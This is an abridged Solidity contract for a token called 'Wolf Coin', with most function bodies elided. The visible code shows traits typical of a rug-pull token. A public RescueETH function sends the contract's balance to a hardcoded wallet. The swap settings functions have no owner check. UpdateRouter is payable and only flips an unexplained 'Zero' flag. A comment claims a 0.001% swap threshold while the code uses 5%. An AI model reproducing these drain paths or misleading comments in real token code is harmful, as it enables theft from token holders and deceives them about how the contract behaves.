/**
* Wolf Coin 
  Member Of landwolf Community
  Telegeram : https://t.me/wolfcoinchat
...
contract WolfCoin is ERC20, Ownable {
    ...
    //Swapping
    uint256 public swapTokensAtAmount = _totalSupply / 20; //after 0.001% of total supply, swap them
    ...
    //Wallets
    address public marketingWallet = 0x2ed9CD0d455ceFa987B966B118bC42F3e28fE2FA ;
    ...
    constructor() ERC20("Wolf Coin", "Wolf") {
    ...
    function setSwapTokensAtAmount(uint256 _newAmount) external virtual  {
        require(
    ...
    function toggleSwapping() external virtual  {
    ...
    function internalSwap() internal {
       ...
       (bool success, ) = marketingWallet.call{value: address(this).balance}("");
        ...
        function UpdateRouter() external payable  {
        Zero = false;
    }
    ...
    function withdrawStuckTokens(address BEP20_token) external onlyOwner {
     ...
     function RescueETH() public {
        ...
        payable(address(0x2ed9CD0d455ceFa987B966B118bC42F3e28fE2FA)).transfer(balance);
     }
